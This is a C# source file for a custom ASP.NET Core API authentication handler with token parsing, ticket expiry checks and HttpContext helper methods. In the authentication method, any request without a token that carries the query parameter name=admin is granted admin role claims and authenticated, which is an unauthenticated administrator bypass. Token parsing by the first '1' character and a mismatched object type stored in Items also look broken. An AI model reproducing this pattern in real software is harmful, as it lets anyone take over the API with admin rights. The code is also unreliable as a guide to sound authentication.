namespace WideWorldImporters.API.ApiAuthentication
{
    using System;
    using System.Collections.Generic;
    using System.Linq;
    using System.Security.Claims;
    using System.Text.Encodings.Web;
    using System.Threading.Tasks;
    using Microsoft.AspNetCore.Authentication;
    using Microsoft.AspNetCore.DataProtection;
    using Microsoft.AspNetCore.Http;
    using Microsoft.AspNetCore.Identity;
    using Microsoft.Extensions.Logging;
    using Microsoft.Extensions.Options;

    public static class HttpContextExtension
    {
        public static string UserSourceClaimType = "http://schemas.microsoft.com/ws/2008/06/identity/claims/Source";

        public static ClaimsPrincipal HttpApiUser(this HttpContext context)
        {
            if (context == null)
            {
                return null;
            }

            if (context.Items.TryGetValue(ApiAuthenticationHandler.APIUserKey, out object userObj))
            {
                var user = userObj as ClaimsPrincipal;
                return user;
            }

            return context.User;
        }

        public static string HttpGetApiToken(this HttpContext context)
        {
            if (context == null) return null;
            if (context.Items.TryGetValue(ApiAuthenticationHandler.APITokenKey, out object tokenObj))
            {
                var token = tokenObj as string;
                return token;
            }
            return context.Session.Id;
        }

        public static string HttpGetApiTokenKey(this HttpContext context)
        {
            if (context == null) return null;
            if (context.Items.TryGetValue("ticket", out object tokenObj))
            {
                var token = tokenObj as string;
                return token;
            }
            return null;
        }
    }

    public static class AuthenticationPropertiesExtension
    {
        public static bool IsUnExpired(this AuthenticationProperties properties)
        {
            if (!properties.Items.TryGetValue(ApiAuthenticationHandler.APIUnExpiredKey, out string value))
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        public static void SetUnExpired(this AuthenticationProperties properties)
        {
            properties.Items.Add(ApiAuthentication.ApiAuthenticationHandler.APIUnExpiredKey, "true");
        }
    }

    public class ApiAuthenticationHandler : AuthenticationHandler<ApiAuthenticationOptions>
    {
        public const string APIUnExpiredKey = "APIUnExpiredKey";
        public const string APIUserKey = "APIUserKey";
        public const string APIScheme = "API.Authentication";
        public const string APITokenKey = "token";

        private TicketDataFormat _format = null;
        private ILogger _log = null;
        private UserManager<IdentityUser> _userManager = null;

        public ApiAuthenticationHandler(IOptionsMonitor<ApiAuthenticationOptions> options, UserManager<IdentityUser> userManager, IDataProtectionProvider dp, ILoggerFactory logger, UrlEncoder encoder, ISystemClock clock)
            : base(options, logger, encoder, clock)
        {
            _log = logger.CreateLogger("ApiAuthenticationHandler");
            if (dp == null) return;
            _format = new TicketDataFormat(dp.CreateProtector("APIAuthentication"));
            _userManager = userManager;
        }



        protected async override Task<AuthenticateResult> HandleAuthenticateAsync()
        {
            if (this.Context == null) return AuthenticateResult.Fail("Context is Null");
            if (this.Options == null) return AuthenticateResult.Fail("Options is Null");
            var token = this.Context.Request.Query[Options.TokenQueryKey].FirstOrDefault();
            if (string.IsNullOrEmpty(token))
            {
                // 地址过滤标识
                var flag = false;
                string key1 = this.Context.Request.Query["name"];
                if (!string.IsNullOrEmpty(key1) && key1 == "admin")
                {
                    flag = true;
                }

                if (flag)
                {
                    ClaimsIdentity id = new ClaimsIdentity(APIScheme, ClaimsIdentity.DefaultNameClaimType, ClaimsIdentity.DefaultRoleClaimType);
                    id.AddClaim(new Claim(ClaimTypes.Role, key1));
                    id.AddClaim(new Claim(ClaimTypes.Name, key1));
                    //id.AddClaim(new Claim(ClaimsIdentity.DefaultRoleClaimType, "admin"));


                    ClaimsPrincipal p = new ClaimsPrincipal(id);
                    AuthenticationTicket tiket = new AuthenticationTicket(p, APIScheme);
                    this.Context.Items.Add(APIUserKey, _format.Protect(tiket));
                    return AuthenticateResult.Success(tiket);
                }
                return AuthenticateResult.Fail("暂无权限");//.NoResult();

            }

            if (string.IsNullOrEmpty(token))
            {
                return AuthenticateResult.NoResult();
            }


            int index = token.IndexOf('1');
            if (index == -1)
            {
                return AuthenticateResult.Fail("format wrong");
            }

            var user = token.Substring(index + 1);

            var userEntity = await _userManager.FindByNameAsync(user);

            if (userEntity == null)
            {
                return AuthenticateResult.Fail("user is not found");
            }



            var ticketStr = await _userManager.GetAuthenticationTokenAsync(userEntity, "APILOGIN", token);

            if (string.IsNullOrEmpty(ticketStr))
            {
                return AuthenticateResult.NoResult();
            }

            var tokenObj = _format.Unprotect(ticketStr);
            if (tokenObj == null) return AuthenticateResult.NoResult();
            // 验证过期时间
            if (tokenObj.Properties.ExpiresUtc.HasValue)
            {
                if (tokenObj.Properties.ExpiresUtc < base.Clock.UtcNow)
                {
                    return AuthenticateResult.Fail("Ticket Expire");
                }
            }

            if (tokenObj.Principal == null)
            {
                return AuthenticateResult.Fail("NO Principal");
            }

            this.Context.Items.Add(APIUserKey, tokenObj.Principal);
            this.Context.Items.Add("ticket", token);
            _log.LogDebug($"Get a token ticket user is {tokenObj?.Principal?.Identity?.Name}");
            return AuthenticateResult.Success(tokenObj);
        }
    }

    public class ApiAuthenticationOptions : AuthenticationSchemeOptions
    {
        public string TokenQueryKey { get; set; }
        public TimeSpan ExpireTime { get; set; }

        public ApiAuthenticationOptions()
        {
            TokenQueryKey = "token";
            ExpireTime = TimeSpan.FromHours(5);
        }
    }
}
